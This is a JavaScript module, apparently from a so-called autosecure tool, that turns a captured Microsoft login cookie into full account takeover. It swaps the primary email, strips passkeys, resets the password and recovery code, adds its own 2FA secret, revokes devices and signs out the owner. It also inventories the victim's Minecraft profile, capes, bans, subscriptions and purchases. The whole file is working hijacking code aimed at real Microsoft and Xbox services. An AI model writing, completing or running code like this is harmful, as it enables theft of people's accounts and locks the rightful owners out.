const generate = require("../utils/generate");
const { domains } = require("../../../configLoader");
const getCookies = require("./getCookies");
const recoveryCode = require("./recoveryCode");
const securityInformation = require("./securityInformation");
const polishHost = require("./polishHost");
const recoveryCodeSecure = require("./recoveryCodeSecure");
const addzyger = require("./addzyger");
const { queryParams } = require("../../../db/database");
const getMSAToken = require("./getmsatoken");
const HttpClient = require("../process/HttpClient")

// cookies
const cookies = require("./Cookies/cookies");

// minecraft
const xbl = require('../minecraft/xbl');
const { newxbl } = require('../minecraft/newxbl');
const ssid = require('../minecraft/ssid');
const profile = require("../minecraft/profile");

// security
const disableTfa = require("./disableTfa");
const loginHelper = require("./loginhelper")
const handlerecsecure = require("../sections/handlerecsecure");

// info
const { getmxbl } = require("./getxbl3")

// sections
const { getinfo } = require("../sections/getinfo")
const mcextra = require("../sections/mcextra")
const removesection = require("../sections/removesection")
const aliasses = require("../sections/aliasses");
const changeinfo = require("../sections/changeinfo");

// helpers
const {
    updateStatus,
    updateExtraInformation,
    logDuration,
    getAcc,
    initializesecure,
    newgamertag,
    generateValidGamertag,
    isUrl
} = require("../process/helpers");

// utils
const fs = require('fs');
const path = require('path');
const changepfp = require("../changeinfo/changePfp");
const removePassKeys = require("../logout/removePassKeys");
const checkmc = require("../../../db/checkmc");
const autonotifier = require("./recode/autonotifier");
const newinfo = require("./recode/newinfo");
const getsecuredata = require("./recode/getsecuredata");
const getsecureinfo = require("./recode/getsecureinfo");
const recoveryCodefix = require("./recoveryCodefix");
const getverificationtoken = require("./getverificationtoken");
const getUUID = require("../hypixelapi/getUUID");
const termLog = require("../utils/logging");


function timeTracker(label = "TimeTracker") {
    const startTime = Date.now();

    async function end() {
        const endTime = Date.now();
        const durationSeconds = ((endTime - startTime) / 1000).toFixed(2);
        const lines = [];

        lines.push(`${label} duration: ${durationSeconds} seconds`);

        if (label === "Finishing & New Info") {
            lines.push('----------------------');
        }

        const logMessage = lines.join('\n') + '\n';

        //   lines.forEach(line => console.log(line));

        return new Promise((resolve, reject) => {
            fs.appendFile('./timelog.txt', logMessage, 'utf8', (err) => {
                if (err) {
                    console.error(`Error writing to file:`, err);
                    reject(err);
                } else {
                    //  console.log(`Duration info appended to timelog.txt`);
                    resolve(durationSeconds);
                }
            });
        });
    }

    return { end };
}

module.exports = async (host, settings, uid, username = null) => {
    termLog.banner("AUTOSECURING MICROSOFT ACCOUNT", `UID: ${uid} | Player: ${username || 'none'}`);
    const initializetimer = timeTracker("Initialize");
    /**
     * Initialize
     */
    termLog.step("AUTOSEC", "Initialize Session", `Creating account context for UID: ${uid}`);
    let acc = await getAcc();
    acc.loginCookie = host;
    let axios = await initializesecure(uid);
    await updateStatus(uid, "msauth", host);
    let accstarted = Date.now();


    let optionalusername = false;
    if (username) {
        optionalusername = true
        console.log(`[RECODE_SECURE] Optional username provided: ${username}`);
    }

    /**
     * Get Cookies and Auth
     */
    console.log(`[RECODE_SECURE] Getting cookies and authentication...`);
    const cookieResult = await getCookies();
    if (!cookieResult) {
        console.log(`[RECODE_SECURE] Failed to get cookies after 3 attempts`);
        acc.email = "Failed to get cookies";
        acc.secEmail = "Failed to get cookies";
        acc.recoveryCode = "Failed to get cookies";
        acc.password = "Failed to get cookies";
        acc.status = "cookie_failed";
        return acc;
    }
    const [apiCanary, amsc, canary] = cookieResult;
    console.log(`[RECODE_SECURE] Cookies retrieved: apiCanary=${!!apiCanary}, amsc=${!!amsc}, canary=${!!canary}`);

    console.log(`[RECODE_SECURE] Polishing host with amsc...`);
    let msauth;
    try {
        msauth = await polishHost(host, amsc);
        console.log(`[RECODE_SECURE] Host polished, msauth result: ${msauth ? 'success' : msauth}`);
    } catch (error) {
        console.log(`[RECODE_SECURE] Error polishing host:`, error.message);
        if (error.response && error.response.status === 400) {
            console.log(`[RECODE_SECURE] HTTP 400 error during host polishing - likely invalid session`);
            acc.email = "Invalid session";
            acc.secEmail = "Invalid session";
            acc.recoveryCode = "Invalid session";
            acc.password = "Invalid session";
            acc.status = "invalid_session";
            return acc;
        }
        console.log(`[RECODE_SECURE] Continuing with unpolished host cookie.`);
        msauth = host;
    }

    if (msauth === "locked") {
        console.log("[RECODE_SECURE] Account is locked!");
        acc.email = "Locked!";
        acc.secEmail = "Locked!";
        acc.recoveryCode = "Locked!";
        acc.password = "Locked!";
        acc.ssid = "Locked!";
        return acc;
    }

    if (msauth === "down") {
        console.log("[RECODE_SECURE] Microsoft services are down!");
        acc.email = "Microsoft services are down!";
        acc.secEmail = "Microsoft services are down!";
        acc.recoveryCode = "Microsoft services are down!";
        acc.password = "Microsoft services are down!";
        acc.ssid = "Microsoft services are down!";
        return acc;
    }
    /**
     * Set Login Cookies
     */
    console.log(`[RECODE_SECURE] Setting login cookies...`);
    axios.setCookie(`__Host-MSAAUTH=${msauth}`)
    axios.setCookie(`__Host-MSAAUTHP=${msauth}`)
    axios.setCookie(`amsc=${amsc}`)
    console.log(`[RECODE_SECURE] Login cookies set successfully`);

    /**
     * Login Authentication
     */
    console.log(`[RECODE_SECURE] Starting login authentication...`);
    let login;
    try {
        login = await loginHelper(axios);
        console.log(`[RECODE_SECURE] Login helper result: ${login}`);
    } catch (error) {
        console.log(`[RECODE_SECURE] Error during login authentication:`, error.message);
        if (error.response && error.response.status === 400) {
            console.log(`[RECODE_SECURE] HTTP 400 error during login - authentication failed`);
            acc.email = "Authentication failed";
            acc.secEmail = "Authentication failed";
            acc.recoveryCode = "Authentication failed";
            acc.password = "Authentication failed";
            acc.status = "auth_failed";
            return acc;
        }
        // Treat other errors as unauthed
        login = "unauthed";
        console.log(`[RECODE_SECURE] Treating error as unauthed state`);
    }

    if (login == "locked") {
        console.log("[RECODE_SECURE] Login failed: Account locked");
        acc.email = "Locked!";
        acc.secEmail = "Locked!";
        acc.recoveryCode = "Locked!";
        acc.password = "Locked!";
        acc.status = "locked";
        return acc;
    } else if (login == "child") {
        console.log("[RECODE_SECURE] Login failed: Child account");
        acc.email = "Child landing, try login via auth!";
        acc.secEmail = "Child landing!";
        acc.recoveryCode = "Child landing!";
        acc.password = "Child landing!";
        acc.status = "Child landing!";
        return acc;
    } else if (login == "unauthed") {
        console.log("[RECODE_SECURE] Login helper reported unauthed, proceeding to verify security cookies directly...");
    }

    console.log('[RECODE_SECURE] Login successful, proceeding with authentication...');
    console.log('Logged in fully authed, should be able to get amrp now!')

    initializetimer.end();



    const getauthtimer = timeTracker("Get Cookies");
    /**
     * Get Auth Cookies
     */
    let hasamc = true;
    let source = null;
    let mxbl = null;

    // Add timeout wrapper for XBL operations
    const timeoutPromise = (promise, timeoutMs = 30000) => {
        let timeoutId;
        const timeout = new Promise((_, reject) => {
            timeoutId = setTimeout(() => reject(new Error('Operation timed out')), timeoutMs);
        });
        return Promise.race([promise, timeout]).finally(() => clearTimeout(timeoutId));
    };

    let [xblResult, cookiedata, mxblresult, msatoken] = await Promise.allSettled([
        timeoutPromise(xbl(acc.loginCookie), 75000), // 75 second timeout for XBL
        timeoutPromise(cookies(axios), 30000),
        timeoutPromise(getmxbl(msauth), 45000),
        timeoutPromise(getMSAToken(msauth), 30000)
    ]).then(results => results.map(result =>
        result.status === 'fulfilled' ? result.value : null
    ));



    // Handle null cookiedata
    if (!cookiedata || !cookiedata.cookies) {
        console.log("[RECODE_SECURE] Cookie data is null, likely timed out or failed");
        acc.email = "Cookie data failed";
        acc.secEmail = "Cookie data failed";
        acc.recoveryCode = "Cookie data failed";
        acc.password = "Cookie data failed";
        acc.status = "cookie_failed";
        return acc;
    }

    const freshamc = cookiedata.cookies.amc;
    const freshjwt = cookiedata.cookies.jwt;
    const freshamrp = cookiedata.cookies.amrp;
    let refresh = null
    let playstationxbl = null;
    let purchasetoken = null;
    if (mxblresult) {
        mxbl = mxblresult.xbl;
        refresh = mxblresult.refresh;
    }

    const tokenobj = {
        apiCanary: apiCanary,
        amsc: amsc,
        amrp: freshamrp,
        amc: freshamc,
        jwt: freshjwt,
        msatoken: msatoken
    }

    // [OPTIMIZATION] START FETCHING SECURITY DATA IN THE BACKGROUND IMMEDITELY
    // This runs parallel to the Minecraft check, saving 1-2 seconds!
    const securityDataPromise = Promise.all([
        getsecuredata(axios, uid, apiCanary, tokenobj),
        getverificationtoken(axios)
    ]);

    // 16h refresh (usertoken, theres prob a better method)
    await updateExtraInformation(uid, "xblrefresh", refresh)


    if (cookiedata.status === "unauthed") {
        acc.email = "unauthed";
        acc.secEmail = "unauthed";
        acc.recoveryCode = "unauthed";
        acc.password = "unauthed";
        acc.status = "unauthed";
        return acc;
    }

    acc.aftersecure = true;

    if (cookiedata.status === "noamc") {
        hasamc = false;
    }

    getauthtimer.end()



    const minecraftimer = timeTracker("Minecraft Timer");

    console.log("Checking Minecraft account");
    try {
        if (!xblResult || typeof xblResult === "string") {
            console.log("[RECODE_SECURE] Initial XBL result unavailable, attempting fallback with msauth/loginCookie...");
            try {
                const fallbackResult = await xbl(msauth || acc.loginCookie);
                if (fallbackResult && typeof fallbackResult !== "string") {
                    xblResult = fallbackResult;
                }
            } catch (err) {
                console.log("[RECODE_SECURE] Fallback XBL error:", err.message);
            }
        }

        if (!xblResult || typeof xblResult === "string") {
            console.log("[RECODE_SECURE] Attempting newxbl with full axios cookie jar...");
            try {
                const newxblRes = await newxbl(axios);
                if (newxblRes && typeof newxblRes !== "string" && newxblRes.XBL) {
                    xblResult = newxblRes;
                    console.log("[RECODE_SECURE] [✔] newxbl fallback success!");
                }
            } catch (err) {
                console.log("[RECODE_SECURE] newxbl fallback error:", err.message);
            }
        }

        if ((!xblResult || typeof xblResult === "string") && mxblresult?.xbl) {
            console.log("[RECODE_SECURE] [✔] Using mxblresult fallback from parallel promises!");
            xblResult = {
                XBL: mxblresult.xbl,
                purchasingtoken: null,
                playxbl: null,
                xuid: null,
                gtg: null,
                uhs: mxblresult.xbl.match(/x=([^;]+)/)?.[1] || null
            };
        }

        if (!xblResult) {
            console.log("[RECODE_SECURE] XBL result is null, likely timed out or failed");
            acc.mc = "XBL Failed";
            acc.newName = "XBL Failed";
            source = "XBL Failed";
        } else if (typeof xblResult === "string" && xblResult === "tfa") {
            console.log("xbl was blocked!");
            acc.mc = "Maybe (dm david asap)";
            acc.newName = "Unknown";
            source = "Maybe has MC";
        }

        if (xblResult && typeof xblResult !== "string") {
            purchasetoken = xblResult.purchasingtoken;
            playstationxbl = xblResult.playxbl;
            acc.xuid = xblResult.xuid || null;
            let XBL = xblResult.XBL || null;
            acc.gamertag = xblResult.gtg || null;
            acc.gtg = xblResult.gtg || null;
            await updateExtraInformation(uid, "gtg", acc.gamertag);

            let sid = null, minecraft = null;
            if (XBL) {
                acc.xbl = XBL;
                console.log(`Got XBL`);
                sid = await ssid(XBL);

                if (sid) {
                    console.log(`Got SSID`);
                    acc.ssid = sid;
                    minecraft = await profile(sid);
                    acc.items = minecraft?.items || [];
                    acc.mcitems = minecraft?.items || [];
                    if (minecraft?.items) {
                        await updateExtraInformation(uid, "mcitems", JSON.stringify(minecraft.items));
                    }

                    if (minecraft?.source) {
                        source = minecraft.source;
                    }

                    if (minecraft?.name) {
                        console.log(`Minecraft source: ${source || minecraft?.source}`);
                        await updateStatus(uid, "username", minecraft.name);
                        acc.oldName = minecraft.name;
                        console.log(`Got Minecraft ${minecraft.name}`);
                        acc.capes = minecraft?.capes || [];
                        acc.newName = minecraft.name;
                    } else {
                        acc.oldName = "Couldn't find!";
                        acc.newName = "Couldn't find!";
                        source = (source && source !== "XBL Failed") ? source : "No Minecraft!";
                        acc.capes = [];
                        await updateStatus(uid, "username", "Couldn't find!");
                    }
                }
            } else {
                acc.oldName = "Couldn't find!";
                acc.newName = "Couldn't find!";
                await updateStatus(uid, "username", "Couldn't find!");
            }
        } else {
            acc.oldName = "Couldn't find!";
            acc.newName = "Couldn't find!";
            await updateStatus(uid, "username", "Couldn't find!");
        }

        if (!source || source === "No Minecraft!" || source === "XBL Failed") {
            source = source || "No Minecraft!";
            acc.mc = source;
            acc.oldName = "Couldn't find!";
            acc.newName = "Couldn't find!";
            if (!settings.secureifnomc) {
                acc.ssid = "No Minecraft!";
                console.log('[RECODE_SECURE] No MC detected & secureifnomc is off, but continuing to alias/security flow...');
            }
        } else {
            console.log(`Setting mc as ${source}`);
            acc.mc = source;
        }
    } catch (e) {
        console.log(`Failed in minecraft block!`);
        console.log(e);
    }

    if (checkmc(acc.mc)) {
        await updateExtraInformation(uid, "hasmc", true)
    } else {
        await updateExtraInformation(uid, "hasmc", false)
    }

    minecraftimer.end()


    const getsecdatatimer = timeTracker("Get Security Data");

    // AWAIT the security data that was fetching in the background
    const [securedata, verificationtoken] = await securityDataPromise;

    axios.axios.defaults.headers.common['__RequestVerificationToken'] = verificationtoken;




    if (securedata?.email) {
        acc.email = securedata.email;
        acc.oldEmail = securedata.email;
    } else {
        console.log(`Couldn't get email!`);
    }

    const aliaseslist = securedata?.aliases || [];
    const canary2 = securedata?.canary;
    let recovery = securedata?.recovery;
    const disabledtfa = securedata?.disabledtfa;
    const securityParameters = securedata?.securityparams;



    if (!securedata?.recovery) {
        console.log(`Regenerating recovery!`)
        recovery = await recoveryCode(axios, securityParameters?.netId, apiCanary, tokenobj)
    }


    // bro istg if it doesn't have it here
    if (!recovery) {
        console.log(`[Important error] Couldn't grab Recovery Code`)
    }


    const { secEmail, password } = await getsecureinfo(settings);
    acc.recoverydata.email = acc.email || "Failed"
    acc.recoverydata.recovery = recovery || "Failed"
    acc.recoverydata.secemail = secEmail || "Failed"
    acc.recoverydata.password = password || "Failed"



    getsecdatatimer.end();



    /// Securing Phases Orchestration
    const securepromisetime = timeTracker("Securing Promises");

    // Phase 1: Parallel Non-Conflicting & Read-Only Operations
    const parallelNonConflicting = [];

    let changedpfp = "Failed (unknown)";
    parallelNonConflicting.push((async () => {
        try {
            if (settings.changepfp) {
                const newpfp = settings.pfp;
                if (newpfp && isUrl(newpfp)) {
                    console.log(`Changing pfp!`);
                    const worked = await changepfp(freshamc, freshjwt, newpfp);
                    changedpfp = worked ? "Set" : "Failed to set";
                } else {
                    changedpfp = "Invalid URL";
                }
            } else {
                changedpfp = "Option is off.";
            }
            await updateExtraInformation(uid, "newpfp", changedpfp);
        } catch (e) {
            console.log(`[RECODE_SECURE] Error changing pfp:`, e.message);
            await updateExtraInformation(uid, "newpfp", "Failed (error)");
        }
    })());

    parallelNonConflicting.push((async () => {
        try {
            const extramc = await mcextra(axios, refresh, acc.xuid, acc.gtg, settings, settings.user_id, uid, acc.loginCookie, acc.ssid, acc.mc, acc.oldName, optionalusername, username, mxbl);
            if (extramc?.newign && extramc.newign !== "Couldn't find!" && extramc.newign !== acc.gamertag) {
                acc.newName = extramc.newign;
            } else if (!minecraft?.name) {
                acc.newName = "Couldn't find!";
            }
            if (extramc?.banchecked) {
                acc.ban = extramc.ban;
                acc.banReason = extramc.banReason;
                acc.banHypixel = extramc.banHypixel;
            }
            if (extramc?.donutBanchecked) {
                acc.donutBan = extramc.donutBan;
                acc.donutBanReason = extramc.donutBanReason;
                acc.banDonut = extramc.banDonut;
            }
            if (extramc?.mcpvpBanchecked) {
                acc.mcpvpBan = extramc.mcpvpBan;
                acc.mcpvpBanReason = extramc.mcpvpBanReason;
                acc.banMcpvp = extramc.banMcpvp;
            }
        } catch (mcErr) {
            console.error(`[RECODE_SECURE] Error in mcextra:`, mcErr.message);
        }
    })());


    parallelNonConflicting.push((async () => {
        try {
            const inforesult = await getinfo(hasamc, acc.oldName, axios, msatoken, uid, acc?.mc, acc?.ssid, playstationxbl, purchasetoken);
            acc.stats = inforesult?.stats;
            acc.donut = inforesult?.donut;
            acc.subscriptions = inforesult?.subs;
            acc.purchases = inforesult?.purchases;

            if (inforesult?.cosmetics || inforesult?.emotes) {
                acc.lunar = {
                    cosmetics: inforesult.cosmetics?.allcosmetics || "None",
                    plusCosmetics: inforesult.cosmetics?.lunarfreecosmetics || "None",
                    equippedCosmetics: inforesult.cosmetics?.equippedcosmetics || "None",
                    emotes: inforesult.emotes?.allemotes || "None",
                    equippedEmotes: inforesult.emotes?.equippedemotes || "None",
                    rank: inforesult.cosmetics?.lunarrank || "None",
                    cosamount: inforesult.cosmetics?.cosmeticamount,
                    emoteamount: inforesult.emotes?.emotesamount
                };
            }
        } catch (infoErr) {
            console.error(`[RECODE_SECURE] Error in getinfo:`, infoErr.message);
        }
    })());

    parallelNonConflicting.push((async () => {
        try {
            await changeinfo(uid, settings, axios, freshamc, freshjwt, verificationtoken);
        } catch (e) {
            console.log(`[RECODE_SECURE] Error in changeinfo:`, e.message);
        }
    })());

    // Execute Phase 1 parallel tasks alongside deterministic state mutations
    const phase1Promise = Promise.all(parallelNonConflicting);

    // Phase 2: Deterministic Account State Mutations
    // Step 2.1: Aliases Workflow (Add alias -> Make primary -> Verify -> Remove old aliases)
    // Run FIRST while session cookies and tokens are fresh and fully authenticated (before password reset invalidates the session)
    try {
        const updatedAcc = await aliasses(axios, canary2, uid, acc, aliaseslist, acc.email, settings, apiCanary, cookiedata, amsc);
        if (updatedAcc?.email) acc.email = updatedAcc.email;
        await Promise.allSettled([
            updateStatus(uid, "email", acc.email),
            updateExtraInformation(uid, "primary", acc.email)
        ]);
    } catch (e) {
        console.log(`[RECODE_SECURE] Error in aliases workflow:`, e.message);
    }

    // Step 2.1b: Passkey Removal (runs AFTER alias mutations to avoid session/state races)
    try {
        const passkeysremoved = await removePassKeys(axios, {
            netId: securityParameters?.netId,
            accountId: securityParameters?.netId
        });
        if (passkeysremoved > 0) console.log(`[RECODE_SECURE] Passkeys removed: ${passkeysremoved}`);
    } catch (e) {
        console.log(`[RECODE_SECURE] Error removing passkeys:`, e.message);
    }

    // Step 2.2: Password & Recovery Code Configuration (Runs on verified acc.email)
    let recoverySecured = false;
    try {
        if (recovery) {
            const notSecuredNote = "Not changed (check status button)";
            const newData = await handlerecsecure(disabledtfa, axios, securityParameters?.netId, acc.email, recovery, secEmail, password, settings, apiCanary, tokenobj);
            acc.password = newData.password || notSecuredNote;
            acc.secEmail = newData.secEmail || notSecuredNote;
            acc.recoveryCode = newData.recoveryCode || recovery;
            await updateStatus(uid, "secemail", acc.secEmail);
            await updateStatus(uid, "password", acc.password);
            await updateStatus(uid, "recoverycode", `${recovery} -> ${acc.recoveryCode}`);
            recoverySecured = Boolean(acc.password && !acc.password.startsWith("Failed") && acc.password !== notSecuredNote);
        } else {
            acc.recoveryCode = "Failed to generate";
            const newData = await recoveryCodefix(axios, securityParameters);
            if (newData?.secured) {
                acc.password = newData.password || "";
                acc.secEmail = newData.secEmail || "";
                acc.recoveryCode = newData.recoveryCode;
                await updateStatus(uid, "secemail", acc.secEmail);
                await updateStatus(uid, "password", acc.password);
                await updateStatus(uid, "recoverycode", `${recovery} -> ${acc.recoveryCode}`);
                recoverySecured = true;
            }
        }
    } catch (e) {
        console.error(`[RECODE_SECURE] Error in recovery/secure block:`, e);
    }

    // Step 2.3: 2FA TOTP (Zyger)
    if (recoverySecured && settings.addzyger) {
        console.log("Adding Zyger!");
        try {
            const { success, secretKey } = await addzyger(axios, apiCanary);
            if (success) {
                console.log("TFA successfully confirmed!");
                await updateStatus(uid, "secretkey", secretKey);
                acc.secretkey = secretKey;
            } else {
                console.log("Enabling 2FA failed!");
                acc.secretkey = "Failed to add";
                await updateStatus(uid, "secretkey", acc.secretkey);
            }
        } catch (error) {
            console.error("Error adding Zyger:", error);
            acc.secretkey = "Failed to add";
            await updateStatus(uid, "secretkey", acc.secretkey);
        }
    } else {
        await updateStatus(uid, "secretkey", 'Option is disabled.');
        acc.secretkey = 'Option is disabled.';
    }

    // Step 2.4: Final Authoritative State Collection & Verification (BUG-03 FIX: Gather BEFORE sign-out)
    const finishtimer = timeTracker("Finishing & New Info");
    try {
        const updatedinfo = await newinfo(axios, uid);
        if (updatedinfo?.newprimary && updatedinfo.newprimary !== acc.email) {
            if (acc.email !== acc.oldEmail && updatedinfo.newprimary === acc.oldEmail) {
                console.log(`[RECODE_SECURE] Ignoring stale primary email from newinfo (propagation delay): ${updatedinfo.newprimary}`);
            } else {
                acc.email = updatedinfo.newprimary;
            }
        }
        await Promise.allSettled([
            updateStatus(uid, "email", acc.email),
            updateExtraInformation(uid, "primary", acc.email)
        ]);
    } catch (newInfoErr) {
        console.error(`[RECODE_SECURE] Error in newinfo:`, newInfoErr.message);
    }

    // Step 2.5: Removal Section (Revoke devices, consents, family, old security emails, cards, and finally Sign Out)
    try {
        await removesection(settings, settings.signout, settings.exploit, uid, axios, securityParameters, msatoken, acc.secEmail, acc.email);
    } catch (e) {
        console.log(`[RECODE_SECURE] Error in removesection:`, e.message);
    }

    // Step 2.6: Fetch TRUE Authoritative Security Emails for Embeds
    try {
        const { securityMethodService, SECURITY_METHOD_TYPES } = require("./securityInformation");
        const methods = await securityMethodService.getSecurityMethods(axios, securityParameters?.netId);
        const emailMethods = methods.filter(m => m.type === SECURITY_METHOD_TYPES.EMAIL);
        if (emailMethods.length > 0) {
            acc.secEmail = emailMethods.map(m => m.displayName).join(", ");
            await updateStatus(uid, "secemail", acc.secEmail);
            console.log(`[RECODE_SECURE] Updated authoritative security emails: ${acc.secEmail}`);
        } else {
            acc.secEmail = "None";
            await updateStatus(uid, "secemail", acc.secEmail);
            console.log(`[RECODE_SECURE] No authoritative security emails found.`);
        }
    } catch (secErr) {
        console.log(`[RECODE_SECURE] Error fetching authoritative security emails:`, secErr.message);
    }

    try {
        await phase1Promise;
    } catch (p1Err) {
        console.error(`[RECODE_SECURE] Phase 1 completion error:`, p1Err.message);
    }

    // Cross-verify Minecraft ownership with active Microsoft Subscriptions
    try {
        let subsData = acc.subscriptions;
        if (typeof subsData === 'string' && (subsData.startsWith('[') || subsData.startsWith('{'))) {
            try { subsData = JSON.parse(subsData); } catch (e) {}
        }
        if (typeof subsData === 'string' && (subsData.startsWith('[') || subsData.startsWith('{'))) {
            try { subsData = JSON.parse(subsData); } catch (e) {}
        }

        if (Array.isArray(subsData)) {
            const hasActiveGamepassSub = subsData.some(s => {
                const sName = String(s?.name || s?.productName || "").toLowerCase();
                return sName.includes("game pass") || sName.includes("gamepass") || sName.includes("xgp");
            });

            if (hasActiveGamepassSub) {
                const hasExplicitPurchase = Array.isArray(acc.items) && acc.items.some(i => {
                    const s = String(i?.source || "").toUpperCase();
                    const n = String(i?.name || "").toLowerCase();
                    return n.includes("minecraft") && !n.includes("bedrock") && !n.includes("dungeon") && !n.includes("legend") &&
                           (s === "PURCHASE" || s === "MC_PURCHASE" || s === "RETAIL");
                });

                if (!hasExplicitPurchase) {
                    console.log(`[RECODE_SECURE] Account has active Game Pass subscription without permanent purchase. Correcting mc = 'Gamepass'`);
                    acc.mc = "Gamepass";
                }
            }
        }
    } catch (subCheckErr) {
        console.error(`[RECODE_SECURE] Error in Game Pass subscription cross-check:`, subCheckErr.message);
    }

    // console.log(`aliases stringified: ${JSON.stringify(aliaseslist)}`)
    let extrainfodata = await queryParams(`SELECT * FROM extrainformation WHERE uid=?`, [uid]);
    // console.log(JSON.stringify(extrainfodata[0]));


    acc.timeTaken = Math.round((Date.now() - accstarted) / 100) / 10;
    acc.uid = uid;

    // For minecraft button
    await Promise.all([
        updateExtraInformation(uid, "ssid", acc.ssid),
        updateExtraInformation(uid, "capes", JSON.stringify(acc.capes || [])),
        updateExtraInformation(uid, "lunar", JSON.stringify(acc.lunar || {})),
        updateExtraInformation(uid, "username", acc.newName)
    ]);


    finishtimer.end();

    termLog.summaryBox("ACCOUNT AUTOSECURE COMPLETED", [
        ["UID", uid],
        ["New Primary Email", acc.email],
        ["Previous Email", acc.oldEmail || "None"],
        ["Gamertag", acc.gamertag || "Unchanged"],
        ["Username", acc.newName || "Couldn't find!"],
        ["Security Email", acc.secEmail || "N/A"],
        ["Password Status", acc.password ? "Updated successfully" : "Unchanged"],
        ["2FA Secret Key", acc.secretkey || "N/A"],
        ["Total Duration", `${acc.timeTaken}s`]
    ]);

    return acc;
};